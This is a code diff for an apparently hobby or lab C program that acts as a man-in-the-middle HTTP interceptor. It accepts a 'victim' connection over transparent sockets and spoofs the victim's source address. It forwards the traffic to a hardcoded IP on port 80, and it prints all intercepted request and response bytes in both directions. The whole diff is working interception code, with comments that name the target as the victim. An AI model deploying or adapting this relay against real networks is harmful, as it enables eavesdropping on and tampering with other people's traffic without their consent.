@@ -15,11 +15,13 @@
 #include <linux/netfilter_ipv4.h>
 
 static void bind_socket(int, struct sockaddr_in *);
-static int err_socket();
+static int err_socket(int);
 static void listen_socket(int);
 static void connect_socket(int, struct sockaddr_in *);
+static void send_all(int, uint8_t *, size_t);
+static void print_buf(uint8_t *, size_t);
 
-#define BUFF_SIZE 64
+#define BUFF_SIZE 600
 
 void * interceptor(void * arg) {
     // file descripors
@@ -39,15 +41,15 @@ void * interceptor(void * arg) {
 
     char ip[INET_ADDRSTRLEN];
     uint8_t * buff = malloc(BUFF_SIZE);
-    int rread;
+    ssize_t rread;
 
     // if (inet_pton(AF_INET, "0.0.0.0", &pc_addr.sin_addr) == -1) {
     //     perror("bad ip");
     //     exit(0);
     // }
 
-    conn[0] = err_socket();  // from victim
-    conn[1] = err_socket();  // to destination
+    conn[0] = err_socket(1);  // from victim
+    conn[1] = err_socket(1);  // to destination
 
     bind_socket(conn[0], &pc_addr);
     listen_socket(conn[0]);
@@ -58,36 +60,53 @@ void * interceptor(void * arg) {
     }
 
     size = sizeof(struct sockaddr_in); // reset if changed
-    if (getsockopt(conn[0], SOL_IP, SO_ORIGINAL_DST, &dst_addr, &size)) {
+    if (getsockopt(conn[0], SOL_IP, IP_ORIGDSTADDR, &dst_addr, &size)) {
         perror("couldn't get socket options");
         exit(0);
     }
 
     bind_socket(conn[1], &victim_addr);
+
+    if (inet_pton(AF_INET, "194.153.145.104", &dst_addr.sin_addr) == -1) {
+        perror("bad ip");
+        exit(0);
+    }
+    dst_addr.sin_port = htons(80);
+
     connect_socket(conn[1], &dst_addr);
 
     // diagnostics
     inet_ntop(AF_INET, (const void *)&victim_addr.sin_addr, ip, INET_ADDRSTRLEN);
     printf("connected peer: %s\n", ip);
+    inet_ntop(AF_INET, (const void *)&dst_addr.sin_addr, ip, INET_ADDRSTRLEN);
+    printf("original destination: %s, port: %d\n", ip, ntohs(dst_addr.sin_port));
+    inet_ntop(AF_INET, (const void *)&pc_addr.sin_addr, ip, INET_ADDRSTRLEN);
+    printf("me me me: %s\n", ip);
 
     // it's http, i know the order; do porperly later
     while ((rread = recv(victim, buff, BUFF_SIZE, 0)) != 0) {
         if (rread == -1) {
             perror("fml");
             break;
+        } else if (rread == 0) {
+            // cannot possibly happen
+            printf("hmmm\n");
+            exit(0);
         }
-        send(conn[1], buff, BUFF_SIZE, 0);
-        printf("%c", *buff);
+
+
+        print_buf(buff, rread);
+        send_all(conn[1], buff, rread);
     }
-    printf("\n");
 
     while ((rread = recv(conn[1], buff, BUFF_SIZE, 0)) != 0) {
         if (rread == -1) {
             perror("fml");
             break;
         }
-        send(victim, buff, BUFF_SIZE, 0);
-        printf("%c", *buff);
+
+        print_buf(buff, rread);
+        send_all(victim, buff, rread);
     }
     printf("\n");
 
@@ -96,7 +115,7 @@ void * interceptor(void * arg) {
     return NULL;
 }
 
-static int err_socket() {
+static int err_socket(int set) {
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     int flag = 1;
 
@@ -104,6 +123,9 @@ static int err_socket() {
         perror("Couldn't get socket");
         exit(0);
     }
+
+    if (!set)
+        return sock;
 
     if (setsockopt(sock, IPPROTO_IP, IP_TRANSPARENT, &flag, sizeof(int)) == -1) {
         perror("failed to make transparent");
@@ -121,7 +143,6 @@ static int err_socket() {
 static void bind_socket(int sock, struct sockaddr_in * addr) {
     if (bind(sock, (struct sockaddr *)addr, sizeof(struct sockaddr_in)) == -1) {
         perror("bind failed");
-        printf("%d\n", errno);
         exit(0);
     }
 }
@@ -139,4 +160,31 @@ static void connect_socket(int sock, struct sockaddr_in * addr) {
         perror("failed to connect");
         exit(0);
     }
+}
+
+static void send_all(int sock, uint8_t * buf, size_t len) {
+    size_t sent = 0;
+    printf("len: %ld\n", len);
+
+    while (len > 0) {
+        ssize_t ssent = send(sock, buf + sent, len, MSG_NOSIGNAL);
+
+        if (ssent == -1) {
+            perror("sendall failed");
+            exit(0);
+        }
+
+        len -= ssent;
+        printf("remaining: %ld\n", len);
+        sent += ssent;
+    }
+
+    printf("sent: %ld\n", sent);
+}
+
+static void print_buf(uint8_t * buf, size_t len) {
+    for (size_t i = 0; i < len; i++) {
+        printf("%c", buf[i]);
+    }
+    printf("\n");
 }
